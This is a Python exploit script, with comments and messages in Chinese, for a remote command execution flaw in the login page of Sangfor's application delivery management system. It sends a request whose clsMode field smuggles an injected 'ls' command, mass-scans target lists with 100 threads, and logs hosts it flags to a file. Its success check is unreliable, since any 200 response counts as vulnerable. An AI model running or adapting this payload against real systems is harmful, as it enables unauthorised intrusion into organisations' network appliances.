# 深信服应用交付管理系统login远程命令执行漏洞
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """      _                _       
 | |    ___   __ _(_)_ __  
 | |   / _ \ / _` | | '_ \ 
 | |__| (_) | (_| | | | | |
 |_____\___/ \__, |_|_| |_|
             |___/         
                    version:1.0.8 
                    author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服应用交付管理系统login远程命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    path = "/rep/login"
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Accept':'*/*',
            'Accept-Language':'zh-CN',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Sec-Fetch-Dest':'empty',
            'Sec-Fetch-Mode':'cors',
            'Sec-Fetch-Site':'same-origin',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Encodding':'gzip'
    }
    data =  "clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    try:
        res  = requests.post(url=target+path,headers=headers,data=data,timeout=10)
        if res.status_code == 200 or 'root' in res.text:
                print(f"[+该url存在漏洞{target}")
                with open('try006.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
